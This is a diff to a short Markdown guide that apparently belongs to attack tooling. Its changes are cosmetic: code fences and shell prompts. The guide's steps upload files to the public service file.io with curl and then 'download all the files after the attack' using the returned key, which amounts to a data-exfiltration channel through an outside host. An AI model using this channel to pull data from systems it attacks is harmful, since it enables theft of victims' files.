@@ -1,8 +1,8 @@
 # Upload files to file.io
 
 1. Run the following curl script and take note of the **KEY** it returns
-    ```bash
-    curl -X 'POST' \
+    ```shell
+    $ curl -X 'POST' \
         'https://file.io/' \
         -H 'accept: application/json' \
         -H 'Content-Type: multipart/form-data' \
@@ -42,8 +42,8 @@
     ```
 
 2. Download all the files after the attack with the following command
-    ```bash
-    curl -X 'GET' \
+    ```shell
+    $ curl -X 'GET' \
         'https://file.io/KEY' \
         -H 'accept: */*' \
         -o 'FILE_NAME_GOES_HERE'
